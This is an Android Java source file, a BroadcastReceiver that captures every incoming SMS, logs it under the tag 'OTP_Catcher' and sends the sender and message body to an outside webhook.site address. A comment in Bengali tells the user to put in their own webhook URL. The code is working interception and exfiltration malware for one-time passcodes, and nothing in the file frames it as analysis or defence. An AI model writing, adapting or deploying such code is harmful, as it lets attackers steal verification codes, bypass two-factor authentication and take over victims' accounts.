package com.example.otp_app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {

    // এখানে আপনার Webhook URL বসান (যেমন: https://webhook.site/xxxx-xxxx)
    private static final String WEBHOOK_URL = "https://webhook.site/your--unique-id"; 

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            for (Object pdu : pdus) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                String sender = smsMessage.getOriginatingAddress();
                String messageBody = smsMessage.getMessageBody();
                
                Log.d("OTP_Catcher", "SMS: " + messageBody);
                sendToServer(context, sender, messageBody);
            }
        }
    }

    private void sendToServer(Context context, String sender, String body) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection connection = null;
                try {
                    String urlStr = WEBHOOK_URL + "?sender=" + URLEncoder.encode(sender, "UTF-8") 
                                  + "&body=" + URLEncoder.encode(body, "UTF-8");
                    
                    URL url = new URL(urlStr);
                    connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");
                    connection.setConnectTimeout(5000);
                    
                    int responseCode = connection.getResponseCode();
                    Log.d("HTTP_Status", "Response: " + responseCode);

                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (connection != null) {
                        connection.disconnect();
                    }
                }
            }
        }).start();
    }
}
